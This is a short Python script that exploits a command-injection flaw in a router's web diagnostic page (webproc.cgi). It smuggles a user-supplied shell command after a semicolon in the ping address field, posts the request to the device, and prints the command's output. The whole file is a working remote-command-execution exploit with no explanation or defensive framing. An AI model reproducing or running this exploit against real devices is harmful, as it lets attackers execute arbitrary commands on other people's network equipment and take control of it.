#!/usr/bin/python
import requests
import sys

if len(sys.argv) > 1:
    data = '{diagnose=get&data={ping_addr=-c 1 127.0.0.1 ;'
    data +=sys.argv[1]
    data +='&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20}}'
    url = 'http://192.168.88.254/cgi-bin/webproc.cgi'
    headers ={'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(url = url, data = data, headers = headers)
    for index,line in enumerate(response.content.split('\n')):
        if index < 6:continue
        print line
